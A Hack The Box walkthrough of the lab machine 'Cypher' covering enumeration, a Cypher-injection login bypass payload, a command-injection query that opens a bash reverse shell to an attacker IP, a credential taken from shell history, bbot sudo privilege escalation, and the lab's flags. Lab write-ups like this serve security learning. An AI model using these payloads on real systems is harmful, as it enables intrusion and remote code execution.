---
title: Cypher
summary: "workflow of HTB machine Cypher"
date: 2025-09-04
tag: htb-machines
---
![](/images/posts/Cypher.png)
[https://app.hackthebox.com/machines/Cypher](https://app.hackthebox.com/machines/Cypher)

---

- **Owned Cypher from Hack The Box!**
![](/images/posts/Cypher_Pwned.png)
[https://labs.hackthebox.com/achievement/machine/2202715/650](https://labs.hackthebox.com/achievement/machine/2202715/650)

---

# Introduction 
[Cypher](https://app.hackthebox.com/machines/Cypher) is a medium-difficulty box that demonstrates Cypher injection in Neo4J, analyzing JAR file, and privilege escalation through bbot.

# Enumeration
## `nmap` scan : 

```bash
└──╼ $nmap -sV -sC 10.10.11.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 21:20 +01
Nmap scan report for 10.10.11.57
Host is up (0.91s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:
- 80 - HTTP
- 22 - SSH

## Port 80 - Web Enumeration
I use `Gobuster` tool to check if there are hidden endpoints : 
```bash
$gobuster dir -u http://cypher.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

...SNIP...

/about                (Status: 200) [Size: 4986]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/demo                 (Status: 307) [Size: 0] [--> /login]
/index                (Status: 200) [Size: 4562]
/index.html           (Status: 200) [Size: 4562]
/login                (Status: 200) [Size: 3671]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]


```

the `/testing` endpoint contains a the file `custom-apoc-extension-1.0-SNAPSHOT.jar` 

![](/images/posts/Cypher_1.png)

## JAR File 
I use `jadx-gui` to decompile bytecode
![](/images/posts/Cypher_2.png)

By opening the file with `jadx-gui` , I found a custom function called `getUrlStatusCode`,it return status code for given URL but it handle URL without any sanitization and add it to `/bin/sh` command, we can use it later for reverse shell.

## Attempt to bypass the login page
![](/images/posts/Cypher_3.png)

when we log in with username `' or 1=1 -- -` , it response with content unusual and unexpected that indicates the backend is using **Neo4j**.
- The application returns a full stack trace upon invalid input. This reveals internal logic, technologies in use, and sensitive query details (including Cypher syntax). This can help us do injection exploitation.
![](/images/posts/Cypher_4.png)

>with a developer's view, to log in, the server retrieves the hash linked to your username from the `SHA1` node and compares it to the SHA1 hash of the password you entered. This is evident because when we try to log in with a password like `' or 1=1 -- -`, the application still returns a normal response `Invalid credentials`.

# Exploit \_Cypher Injection\_
To bypass the login logic. we will inject Cypher query always returns the SHA1 hash of the string `test` as the username with `test` as the password.

```json
{
  "username": "' or 1=1 RETURN 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3' as hash//",
  "password": "test"
}
```

![](/images/posts/Cypher_5.png)

# Foothold \_Command injection\_
After Log in , we can access to `/demo` endpoint where we can execute arbitrary Cypher queries. 

![](/images/posts/Cypher_6.png)

From list of queries , in `HTTP Statuses` there is the `getUrlStatusCode` function that we found previously in `jar` file 
![](/images/posts/Cypher_7.png)

So , we can do RCE and get a reverse shell using this query

malicious query : 
```cypher
CALL custom.getUrlStatusCode(\"http://;bash -c 'bash -i >& /dev/tcp/10.10.15.1/4444 0>&1'\")
```

![](/images/posts/Cypher_8.png)

# Post-exploitation
the current user `neo4j` : 
```bash
neo4j@cypher:~$ id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

existing users : 
```bash
neo4j@cypher:~$ ls /home
graphasm
```

If we run `history` command , we will can see a command contains password `cU4btyib.20xtCMCXkBmerhK` , If we try to use this password with the user `graphasm` we will succeed.
```bash
neo4j@cypher:~$ history
history
    1  neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK  
```
>[!success] Credentials 
>credentials to SSH : `graphasm:cU4btyib.20xtCMCXkBmerhK`
## Shell as `graphasm`
Current user : 
```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

```

> the user can run `bbot` command with full root privileges

## Privileges Escalation
- [BBOT](https://www.blacklanternsecurity.com/bbot/Stable/) is a powerful open-source bug bounty / recon automation tool used for subdomain enumeration, port scanning, web spidering, and more.
- this tool already vulnerable and allow to us escalate privileges

public exploitation : [https://seclists.org/fulldisclosure/2025/Apr/19](https://seclists.org/fulldisclosure/2025/Apr/19)

> Using this method of exploitation we will get the root shell

![](/images/posts/Cypher_9.png)

####  *<span style="color:rgb(0, 176, 80)">Happy Hacking!</span>*

# Flags 
- user flag : `64b6bd008532e96d0f69002de2358d7a`
- root flag : `46934f6ff06cd24dcf5c63b4393d7b83`

